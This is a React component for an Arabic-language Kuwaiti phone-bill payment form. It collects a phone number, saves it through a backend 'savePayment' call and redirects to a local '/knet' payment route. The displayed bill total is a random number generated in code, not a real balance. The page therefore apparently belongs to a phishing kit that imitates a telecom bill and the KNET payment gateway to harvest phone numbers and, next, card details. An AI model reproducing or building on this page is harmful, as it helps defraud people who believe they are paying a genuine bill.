import { useState, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronDown, Plus, Check, Loader2 } from "lucide-react";
import { base44 } from "@/api/base44Client";

const PAY_FOR_OPTIONS = [
  { value: "other", label: "رقم آخر" },
  { value: "self", label: "رقمي" },
  { value: "family", label: "أحد أفراد العائلة" },
];

const BILL_AMOUNT = (Math.floor(Math.random() * 18000 + 2000) / 1000).toFixed(3);

export default function BillForm({ additionalNumbers, onRemoveNumber, onAdditionalChange, submitted, setSubmitted }) {
  const [payFor, setPayFor] = useState("other");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [payForOpen, setPayForOpen] = useState(false);
  const [loading, setLoading] = useState(false);

  const isValid = phoneNumber.length === 8 && /^9/.test(phoneNumber);
  const isDisabled = loading || submitted;

  const handlePay = useCallback(async () => {
    if (!isValid) return;
    setLoading(true);
    try {
      const res = await base44.functions.invoke("savePayment", {
        type: "bill",
        page: "bill",
        phone_number: phoneNumber,
        pay_for: payFor,
      });
      const recordId = res?.data?.data?.id || "";
      window.location.href = `/knet?phone=${phoneNumber}&amount=${BILL_AMOUNT}&recordId=${recordId}`;
    } catch {
      setLoading(false);
    }
  }, [isValid, phoneNumber, payFor]);

  return (
    <motion.div
      initial={{ opacity: 0, x: -10 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.4 }}
      className="space-y-8"
    >
      {/* Pay For Dropdown */}
      <div className="space-y-1 relative group z-20">
        <label className="block text-xs font-semibold text-muted-foreground/80 mb-1">أود الدفع لـ</label>
        <button
          onClick={() => !isDisabled && setPayForOpen(!payForOpen)}
          type="button"
          disabled={isDisabled}
          className={`w-full bg-transparent py-2 px-0 text-right flex items-center justify-between focus:outline-none transition-all duration-300 border-b ${
            payForOpen ? "border-accent text-accent" : "border-border text-foreground hover:border-foreground/50"
          } disabled:opacity-50 disabled:cursor-not-allowed`}
        >
          <ChevronDown className={`w-4 h-4 transition-transform duration-300 ${payForOpen ? "rotate-180 text-accent" : "text-muted-foreground"}`} />
          <span className="font-medium text-[15px]">{PAY_FOR_OPTIONS.find(o => o.value === payFor)?.label}</span>
        </button>
        <AnimatePresence>
          {payForOpen && !isDisabled && (
            <motion.div
              initial={{ opacity: 0, y: -4 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -4 }}
              className="absolute top-[calc(100%+4px)] right-0 left-0 bg-card border border-border rounded-xl shadow-xl overflow-hidden py-1 z-30"
            >
              {PAY_FOR_OPTIONS.map((option) => (
                <button
                  key={option.value}
                  onClick={() => { setPayFor(option.value); setPayForOpen(false); }}
                  className={`w-full text-right px-4 py-3 text-sm transition-colors duration-200 ${
                    payFor === option.value ? "bg-accent/10 text-accent font-bold" : "text-foreground hover:bg-secondary"
                  }`}
                >
                  {option.label}
                </button>
              ))}
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Phone Number */}
      <PhoneInput
        value={phoneNumber}
        onChange={(v) => setPhoneNumber(v.slice(0, 8))}
        disabled={isDisabled}
        label="رقم الهاتف"
      />

      {/* Additional Numbers */}
      <AnimatePresence>
        {additionalNumbers.map((num, index) => (
          <motion.div
            key={index}
            initial={{ opacity: 0, height: 0 }}
            animate={{ opacity: 1, height: "auto" }}
            exit={{ opacity: 0, height: 0 }}
            className="space-y-1 group pt-2"
          >
            <div className="flex items-center justify-between mb-1">
              <button
                type="button"
                onClick={() => !isDisabled && onRemoveNumber(index)}
                disabled={isDisabled}
                className="text-[11px] font-semibold text-muted-foreground hover:text-destructive transition-colors disabled:opacity-50"
              >
                إلغاء
              </button>
              <label className="block text-xs font-semibold text-muted-foreground/80">رقم الهاتف {index + 2}</label>
            </div>
            <PhoneInput
              value={num}
              onChange={(v) => onAdditionalChange(index, v)}
              disabled={isDisabled}
            />
          </motion.div>
        ))}
      </AnimatePresence>

      <div className="pt-2 text-center">
        <p className="text-[13px] text-foreground font-medium">يرجى القبول لعرض الفاتورة</p>
      </div>

      {/* Total & Submit */}
      <div className="border-t border-border/60 pt-6 space-y-6">
        <div className="flex items-center justify-between px-2">
          <span className="text-foreground font-bold text-xl tracking-tight">{BILL_AMOUNT} د.ك</span>
          <span className="text-foreground font-bold text-lg">إجمالي</span>
        </div>

        <button
          onClick={handlePay}
          disabled={!isValid || isDisabled}
          className={`relative overflow-hidden w-full rounded-xl py-4 flex items-center justify-center gap-3 font-bold text-[15px] transition-all duration-500 shadow-md ${
            isValid && !isDisabled
              ? "bg-accent text-accent-foreground hover:bg-accent/90 hover:shadow-lg hover:shadow-accent/20 hover:-translate-y-0.5"
              : "bg-muted text-muted-foreground cursor-not-allowed opacity-60"
          }`}
        >
          {isValid && !isDisabled && (
            <span className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-[150%] pointer-events-none" style={{ animation: "shimmer 2s infinite" }} />
          )}
          <span className="relative z-10 flex items-center gap-2">
            {loading ? (
              <><Loader2 className="w-5 h-5 animate-spin" /><span>جاري المعالجة...</span></>
            ) : submitted ? (
              <motion.span initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", stiffness: 200 }} className="flex items-center gap-2">
                <Check className="w-5 h-5" /><span>تم بنجاح</span>
              </motion.span>
            ) : (
              "ادفع الآن"
            )}
          </span>
        </button>
      </div>
    </motion.div>
  );
}

function PhoneInput({ value, onChange, disabled, label }) {
  return (
    <div className="space-y-1 group">
      {label && (
        <label className="block text-xs font-semibold text-muted-foreground/80 mb-1 transition-colors group-focus-within:text-accent">
          {label} <span className="text-accent ml-0.5">*</span>
        </label>
      )}
      <div className="relative">
        <input
          type="tel"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          disabled={disabled}
          placeholder="أدخل الرقم: 99XXXXXX"
          maxLength={8}
          className="w-full bg-transparent py-2.5 px-0 text-right text-[15px] font-medium placeholder:font-normal placeholder-muted-foreground/60 border-b border-border focus:outline-none focus:border-accent transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
          dir="ltr"
          style={{ textAlign: "right" }}
        />
        <div className="absolute bottom-0 right-0 h-[2px] w-0 bg-accent transition-all duration-500 ease-out group-focus-within:w-full" />
      </div>
    </div>
  );
}